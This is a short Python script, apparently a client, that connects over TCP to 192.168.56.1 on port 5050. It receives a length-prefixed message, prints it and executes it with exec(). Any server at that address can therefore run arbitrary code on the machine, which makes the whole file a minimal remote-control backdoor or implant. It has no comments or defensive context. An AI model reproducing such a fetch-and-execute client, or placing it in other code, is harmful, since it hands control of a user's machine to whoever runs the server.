import socket

HEADER = 64
PORT = 5050
FORMAT = 'utf-8'
SERVER = "192.168.56.1"
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def wait():
    msglen = client.recv(HEADER).decode(FORMAT)
    if msglen:
        msglen = int(msglen)
        msg = client.recv(msglen)
        print(msg)
        exec(msg)


wait()